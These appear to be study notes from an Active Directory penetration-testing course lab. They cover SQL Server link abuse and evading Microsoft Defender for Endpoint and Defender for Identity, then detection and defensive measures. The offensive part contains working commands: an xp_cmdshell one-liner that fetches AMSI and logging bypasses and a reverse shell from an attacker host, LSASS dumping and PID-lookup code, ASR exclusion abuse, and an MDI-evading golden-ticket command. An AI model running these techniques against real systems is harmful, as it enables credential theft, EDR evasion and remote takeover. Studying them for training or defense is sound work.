- ##### ***Enumerate DB Links - Manually***
Openquery() function can be used to run queries on a linked DB: `select * from openquery("dcorp-sql1",'select * from master..sysserver'` (sql query that connects to dcorp-sql1 and it checks if there is another link)
Openquery queries can be chained to access links within links (nested links) `select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt","select * from master..sysservers")')`
- ##### ***Enumerate DB Links***
`Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose` (Will keep looking until it reaches the last link), 
we find we have sa (sysadmin) on eu-sql1.eu.eurocorp.local of another forest
`Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'cmd /c set username'"` (execute commands on all of the DB links)
`Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.X/sbloggingbypass.txt);iex (iwr -UseBasicParsing http:/172.16.100.X/amsibypass.txt);iex (iwr -UseBasicParsing http://172.16.100.X/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget eu-sql1` (using xp_cmdshell it starts a powershell session that downloads script block logging and AMSI bypass and get a reverse shell) ***Remember to setup listener***
# **Learning Objective 22**
[[Learning Objective 22]]
# **EDR**
protect individual devices (endpoints) by continously monitoring for and responding to security threats. It includes features for threat detection, incident response, investigation, and forensics, making it a vital component of modern cybersecurity strategies. EDRs correlate activity to gain broader telemetry and improve on detections, even if all performed activity is undetected by an AV, EDRs can still correlate all actions performed to identigy attacker TTPs.
### **MDE**
Microsoft Defender for Endpoint, collects and processes behavioral signals from the OS and analyzes this using cloud security analytics. Also supports detections based on ASR (Attack Surface Reduction) rules, Exploit/Network protection, CFA (Controlled Folder Access) and Device Control
#### **MDE Bypass**
perform: SQL command execution through SQL Server links, Tool transfer, Credential extraction, Data exfiltration, Laterla movement/remote access
#### **MDE Bypass - Credential Extraction - LSASS Dump**
direct interaction/extraction of data from LSASS process is detected by MDE. More opsec friendly way is by performing a dump of the LSASS process in a covert way and then exfiltrating it to later analyze offline. However, standard techniques to create LSASS dumps (ex: taskmanager -> create dump file) are detected and blocked.
Most tools create a LSASS dump by:
1. Gaining a handle to the LSASS process
2. Creating a minidump using the MiniDumpWriteDump WinAPI function implemented in dbghelp.dll / dbgcore.dll
3. Writing the dump file on disk
All of these are heavily monitored by EDRs and are usually detected and blocked. To circumvent these detections, we can avoid using tools that implement the MiniDumpWriteDump function and perform the LSASS dump in a different way.
Like for example, 
MiniDumpDotNet (https://github.com/WhiteOakSecurity/MiniDumpDotNet) that implements a custom rewritten reimplementation of the MiniDumpWriteDump Windows API function. In this tool, the MiniDumpWriteDump function is reversed and a custom implementation is implemented based on a BOF (Beacon Object File) adaption and ReactOS source code. MiniDumpDotNet provides .NET CLR injectable LSASS process dumping capability along with CLR support (.NET runtime) to support execution through standalone binary, assembly.load(), PowerShell and JScript/VBS. It can also be used to dump other processes.
clone/download the project:
`git clone https://github.com/WhiteOakSecurity/MiniDumpDotNet.git` 
(build the project: Build -> Build Solution, that will generate both a binary exe, as well as a .NET class library)
Check for any detections:
`.\DefenderCheck.exe C:\AD\Tools\minidumpdotnet.exe`
Dump the LSASS process with minidumpdotnet:
`.\minidumpdotnet.exe <LSASS PID> <minidump file>`
#### **MDE Bypass - Credential Extraction - LSASS Dump using Custom APIs - Find LSASS PID**
Using commands like `tasklist /v` to enumerate the LSASS PID is detected by MDE. To avoid this, we can make use of standard WINAPIs to find the LSASS PID which is opsec safe.
In case of RDP access, tools like Task Manager (or other less suspicious alternatives) could also be used for finding LSASS PID.
Code snippet of a custom function called FindPID in C++ to dynamically enumerate the LSASS PID:
```C++
//Find PID of a process by name
int FindPID(const chat* procname)
{
	int pid=0;
	PROCESSSENTRY32 proc = {};
	proc.dwSize = sizeof(PROCESSSENTRY32);
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); bool bProc = Process32First(snapshot, &proc);
	while (bProc)
	{
		if (strcmp(procname, proc.szExeFile) == 0)
		{
			pid = proc.th32ProcessID;
			break;
		}
		bProc = Process32Next(snapshot, &proc);
	}
	return pid;
}

```
If the FindPID function is added to MiniDumpDotNet tool, there is a detection by MDE.
Using the FindPID code in a standalone executable is not detected by Defender AV or MDE. 
Lets call it FindLSASSPID.exe
`.\DefenderCheck.exe C:\AD\Tools\FindLSASSPID.exe`
#### **MDE Bypass - Tools Transfer and Execution**
Downloading tools over HTTP(S) can be risky as it does increase the risk score and chances of detection by the EDR. However, if binaries that are intended for downloads such as Edge (msedge.exe) are available on the target we can perform HTTP(S) downloads without any detections. Another opsec friendly option would be to share files over SMB. Execution can be directly performed from a readable share and is less risky than standard download and execute actions
#### **MDE Bypass - Breaking Detection Chains**
EDRs correlate activity in a specific time interval after which it is reset, this varies for each EDR. To bypass these correlation-based detections we can:
- Attempt to wait for a small-time interval (~10 mins) before performing the next query.
- Append non-suspicious queries in between subsequent suspicious ones to break detection chains. (In this case, we will run simple SQL queries on the eu-sql server) 
#### **MDE Bypass - Lateral Movement - ASR rules**
MDE correlates detections heavily around ASR rules. ASR rules are configurations that can be applied and customized to reduce the attack surface of a machine. These rules can be customized and referenced with their unique GUIDs. ASR rules are written in .lua and can be reversed and extracted from a specific target Windows machine.
ASR rules are easy to understand. For example `GetMonitoredLocations` function displays processes that are monitored and remote execution using them will result in detection.
OS trusted methods like WMI and PSRemoting or administrative tools like PSExec are detected by MDE. To avoid detections based on specific ASR rule such as "Block process creations originating from PSExec and WMI commands" rule:
- We can use alternatives such as winrm access (winrs) instead of PSExec/WMI execution (this is undetected by MDE but detected by MDI)
- Use the `GetCommandLinedExclusions` function which displays a list of command line exclusions (Ex: `".:\\windows\\ccm\\systemtemp\\.+"`), if included in the command line will result in bypassing this rule and detection.
`C:\AD\Tools\WSManWinRM.exe eu-sql.eu.eurocorp.local "cmd /c notepad.exe C:\Windows\ccm\systemtemp\"`
#### **MDE Bypass - Lateral Movement - Process Detection**
Once we have remote access on a machine, we can use commands like whoami.exe for initial enumeration. Since whoami.exe is unlikely to be used under a process like sqlservr.exe, a detection is likely to happen. A more opsec friendly way is using alternatives such as `SET USERNAME` which performs the same functionality as whoami.exe to enumerate the current username using environment variables
# **Learning Objective 23**
[[Learning Objective 23]]
# **Detection and Defense**
 Securing Privileged Access: 
https://learn.microsoft.com/en-us/security/privileged-accessworkstations/overview
 Best Practices for Securing Active Directory: 
https://learn.microsoft.com/en-us/windows-server/identity/adds/plan/security-best-practices/best-practices-for-securing-activedirectory
### **Protect and Limit DAs**
 Reduce the number of DA in the environment.
 Do not allow or limit login of DAs to any other machine other than the DCs. If logins to some servers is necessary, do not allow other admins to login to that machine.
 (Try to) Never run a service with a DA. Credential theft protections which are rendered useless in case of a service account.
 Set "Account is sensitive and cannot be delegated" for DAs
#### **Protected Users Group:**
 A group introduced in Server 2012 R2 for "better protection 
against credential theft" by not caching credentials in insecure ways. A user added 
to this group has following major device protections:
 Cannot use CredSSP and WDigest - No more cleartext credentials caching.
 NTLM hash is not cached.
 Kerberos does not use DES or RC4 keys. No caching of clear text cred or long term keys.
 If the domain functional level is Server 2012 R2, following DC protections are 
available:
 No NTLM authentication.
 No DES or RC4 keys in Kerberos pre-auth.
 No delegation (constrained or unconstrained)
 No renewal of TGT beyond initial four hour lifetime - Hardcoded, unconfig
(https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)
(https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/how-to-configure-protected-accounts#BKMK_AddtoProtectedUsers)
 Needs all domain control to be at least Server 2008 or later (because 
AES keys).
 Not recommended by MS to add DAs and EAs to this group without 
testing "the potential impact" of lock out. 
 No cached logon ie.e no offline sign-on.
 Having computer and service accounts in this group is useless as their 
credentials will always be present on the host machine.
### **Isolate administrative workstations**
#### **Privileged Administrative Workstations (PAWs):**
 A hardened workstation for performing sensitive tasks like 
administration of domain controllers, cloud infrastructure, sensitive 
business functions etc. 
 Can provides protection from phishing attacks, OS vulnerabilities, 
credential replay attacks. 
 Admin Jump servers to be accessed only from a PAW, multiple strategies
 Separate privilege and hardware for administrative and normal tasks.
 Having a VM on a PAW for user tasks.
### **Secure local administrators**
#### **LAPS (Local Administrator Password Solution):**
 Centralized storage of passwords in AD with periodic randomizing where read permissions are access controlled.
 Computer objects have two new atrributes - ms-mcs-AdmPwd attribute stores the clear text passwords and ms-mcs-AdmPwdExpirationTime controls the password change.
 Storage in clear text, transmission is encrypted
 Note - With careful enumeration, it is possible to retrieve which users can access the clear text password providing a list of attractive targets!
### **Time bound and JEA (Just Enough Administration)**
#### **Time Bound Administration - JIT:**
 Just In Time (JIT) administration provides the ability to grant time-bound 
administrative access on per-request bases. 
 Check out Temporary Group Membership! (Requires Privileged Access 
Management Feature to be enabled which can't be turned off later)
`Add-ADGroupMember -Identity 'Domain Admins' -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 60)`
#### **Time Bound Administration - JEA:**
 JEA (Just Enough Administration) provides role based access control for 
PowerShell based remote delegated administration. 
 With JEA non-admin users can connect remotely to machines for doing 
specific administrative tasks. 
 For example, we can control the command a user can run and even 
restrict parameters which can be used. 
 JEA endpoints have PowerShell transcription and logging enabled
### **Isolate admins in a separate forest and breach containment using Tiers and ESAE**
#### **Detection and Defense - Tier Model:**
Active Directory Administrative Tier Model
 Composed of three levels only for administrative accounts:
	 Tier 0 - Accounts, Groups and computers which have privileges across the enterprise like domain controllers, domain admins, enterprise admins. . 
	 Tier 1 - Accounts, Groups and computers which have access to resources having significant amount of business value. A common example role is server administrators who maintain these operating systems with the ability to impact all enterprise services.
	 Tier 2 - Administrator accounts which have administrative control of a significant amount of business value that is hosted on user workstations and devices. Examples include Help Desk and computer support administrators because they can impact the integrity of almost any user data.
 Control Restrictions - What admins control.
 Logon Restrictions - Where admins can log-on to.
#### **Tier Model : Control Restrictions:**
![[Pasted image 20241010160337.png]]
#### **Tier Model : Logon Restrictions:**
![[Pasted image 20241010160456.png]]
#### **Detection and Defense - ESAE:**
ESAE (Enhanced Security Admin Environment)
 Dedicated administrative forest for managing critical assets like administrative 
users, groups and computers. 
 Since a forest is considered a security boundary rather than a domain, this 
model provides enhanced security controls. 
 The administrative forest is also called the Red Forest. 
 Administrative users in a production forest are used as standard nonprivileged users in the administrative forest.
 Selective Authentication to the Red Forest enables stricter security controls 
on logon of users from non-administrative forests. 
 Microsoft retired ESAE in 2021 and replaced it with Privileged Access Strategy 
but it is still worth discussing. 
(https://learn.microsoft.com/en-us/security/compass/esae-retirement)
(https://learn.microsoft.com/en-us/security/compass/privileged-access-strategy)
![[Pasted image 20241010160708.png]]
#### **Detection and Defense - Credential Guard:**
 It "uses virtualization-based security to isolate secrets so that only 
privileges system software can access them".
 Effective in stopping PTH and Over-PTH attacks by restricting access to 
NTLM hashes and TGTs. It is not possible to write Kerberos tickets to 
memory even if we have credentials.
(https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard)
(https://www.blackhat.com/docs/us-15/materials/us-15-Moore-Defeating%20Pass-the-Hash-Separation-Of-Powers-wp.pdf)
 But, credentials for local accounts in SAM and Service account 
credentials from LSA Secrets are NOT protected. 
 Credential Guard cannot be enabled on a domain controller as it breaks 
authentication there. 
 Only available on the Windows 10+ Enterprise edition and Server 
2016/later.
 Mimikatz can bypass it but still, no need to not use it. 
#### **Detection and Defense - Device Guard (WDAC):**
 It is a group of features "designed to harden a system against malware attacks. Its 
focus is preventing malicious code from running by ensuring only known good code 
can run." 
 Three primary components:
 Configurable Code Integrity (CCI) - Configure only trusted code to run
 Virtual Secure Mode Protected Code Integirty - Enforces CCI with Kernerl Mode (KMCI) and User Mode (UMCI)
 Platform and UEFI Secure Boot - Ensures boot binaries and firmware integrit
(https://learn.microsoft.com/en-us/windows/security/application-security/application-control/introduction-to-device-guard-virtualization-based-security-and-windows-defender-application-control)
#### **Detection and Defense - MDI:**
 "..identify, detect, and investigate advanced threats, compromised identities, and malicious insider actions directed to your organization."
 MDI sensors are installed on DCs and Federation servers. Analysis and alerting is done in the Azure Cloud.
 MDI can be used for detecting:
 Recon
 Compromised credentials (Brute-Force, Kerberoasting, etc...)
 Lateral Movement (PTH, OPTH, etc...)
 Domain Dominance (DCSync, Golden Ticket, Skeleton Key, etc...)
 Exfiltration
(https://learn.microsoft.com/en-us/defender-for-identity/)
(https://learn.microsoft.com/en-us/defender-for-identity/understanding-security-alerts)
#### **Detection and Defense - MDI Bypass:**
 They keys is to avoid talking to the DC as long as possible and make appear the traffic we generate as attacker normal.
 To bypass DCSync detection, go for users which are whilelisted. For example, the user account used for PHS may be whitelisted.
 Also if we have NTLM hash of a DC, we can extract NTLM hashes of any machine account using netsysnc
 If we forge a Golden Ticket with SID History od the DCs group and EDCs group, there are less chances of detection my MDI
`C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:dcorp-dc$ /domain:dollarcorp.moneycorp.local /id:1000 /sid:<DC SID> /sids:<EDC SIDS,S-1-5-9> /krbtgt:<AESkey> /ptt" "exit"`
(https://www.blackhat.com/docs/us-17/thursday/us-17-Mittal-Evading-MicrosoftATA-for-ActiveDirectory-Domination.pdf)
#### **Detection and Defense - Golden Ticket:**
 Event ID 
 4624: Account Logon
 4672: Admin Logon
`Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List -Property *`
#### **Detection and Defense - Silver Ticket:**
 Event ID 
 4624: Account Logon
 4634: Account Logoff
 4672: Admin Logon
`Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List -Property *`
#### **Detection and Defense - Skeleton Key:**
 Events
 System Event ID 7045 - A service was installed on the system (Type Kernel Mode driver)
 Events ("Audit privilege use" must be enabled)
 Security Event ID 4673 - Sensitive Privilege Use
 Event ID 4611 - A trusted logon process has been registred with Local Security Authority
 `Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*"}`
 Not recommended:
 `Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*" -and $_.message -like "*mimidrv*"}`
 Mitigation
 Running lsass.exe as protected process is really handy as it forces attacker to load a kernel mode driver.
 Make sure that you test it throughly as many drivers and plugins may not load with the protection
 `New-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name RunAsPPL -Value 1 -Verbose`
  Verify after a reboot
 `Get-WinEvent -FilterHashtable @{Logname='System';ID=12} | ?{$_.message -like "*protected process*"}`
(https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
#### **Detection and Defense - DSRM:**
 Events
 Event ID 4657 - Audit creation/change of `HKLM:\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior`
#### **Detection and Defense - Malicious SSP:**
 Events
 Event ID 4657 - Audit creation/change of `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`
#### **Detection and Defense - Kerberoast:**
 Events
 Event ID 4769 - A Kerberos ticket was requested 
 Mitigation
 Service Accounts Passwords should be hard to guess (greater than 35 characters)
 Use Group Managed Service Accounts (Automatic change of password periodically and delegated SPN Management)
(https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview)
 Since 4769 is logged very frequently on a DC. We may like to filter results based on the following information from logs:
 Service name should not be krbtgt
 Service name does not end with $ (to filter out machine accounts used for services)
 Account name should not be machine@domain (to filter out requests from machines)
 Failure code is '0x0' (to filter failures, 0x0 is success)
 Most importantly, ticket encryption type is 0x17
#### **Detection and Defense - ACL Attacks:**
 Events
 Security ID 4662 (Audit Policy for object must be enabled) - An operation was performed on an object
 Security ID 5136 (Audit Policy for object must be enabled) - An directory service was modified
 Security ID 4670 (Audit Policy for object must be enabled) - Permissions on an object were changed
 Useful tool
 AD ACL Scanner - Create and compare reports of ACL
(https://github.com/canix1/ADACLScanner)
#### **Detection and Defense - Trust Tickets:**
 SID Filtering
 Avoid attacks which abuse SID History (child to root domain PE, that is, DA from a child to EA on forest root)
 Enabled by default on all inter-forest trusts. Intra-forest trusts are assumed secured by default (MS considers forest and not the domain to be a security boundary)
 But, since SID Filtering has potential to break applicationsand user access, it is often disabled. (https://technet.microsoft.com/en-us/library/cc755321(v=ws.10).aspx)
 In an inter-forest trust, if Selective Authentication is configured, users between the trusts will not be automatically authenticated. Individual access to domains and servers in the trusting domain/forest should be given
![[Pasted image 20241010170333.png]]
#### **Detection and Defense - Deception:**
 Deception is a very effective technique in AD defense.
 By using decoy domain objects, defenders can trick adversaries to follow a particular attack path which increases chances of detection and increase their cost in terms of time.
 Traditionally, deception has been limited to leave honey credentials on some boxes and check their usage but we can use it effectively during other phases of an attack.
 What to target? Adversary mindset of going for the "lowest hanging fruit" and 
illusive superiority over defenders.
 We must provide the adversaries what they are looking for. For example, what 
adversaries look for in a user object: 
 A user with high privileges.
 Permissions over other objects.
 Poorly configured ACLs.
 Misconfigured/dangerous user attributes and so on.
 Let's create some user objects which can be used for deceiving adversaries. We can 
use Deploy-Deception for this: https://github.com/samratashok/Deploy-Deception
 Note that Windows Settings|Security Settings|Advanced Audit Policy 
Configuration|DS Access|Audit Directory Service Access Group Policy needs to be 
configured to enable 4662 logging.
#### **Detection and Defense - User Deception:**
 Creates a decoy user whose password never expires and a 4662 is 
logged whenever x500uniqueIdentifier - d07da11f-8a3d-42b6-b0aa76c962be719a property of the user is read.:
`Create-DecoyUser -UserFirstName user -UserLastName manager -Password Pass@123 | Deploy-UserDeception - UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
 This property is not read by net.exe, WMI classes (like 
Win32_UserAccount) and ActiveDirectory module. But LDAP based tools 
like PowerView and ADExplorer trigger the logging.
 Create a decoy user named decda and make it a member of the Domain 
Admins group. As a protection against potential abuse, Deny logon to the user 
on any machine.
`Create-DecoyUser -UserFirstName dec -UserLastName da -Password Pass@123 | Deploy-PrivilegedUserDeception -Technique DomainAdminsMemebership -Protection DenyLogon -Verbose`
 If there is any attempt to use the user credentials (password or hashes) a 
4768 is logged.
 Any enumeration which reads DACL or all properties for the user will result in 
a 4662 logging.
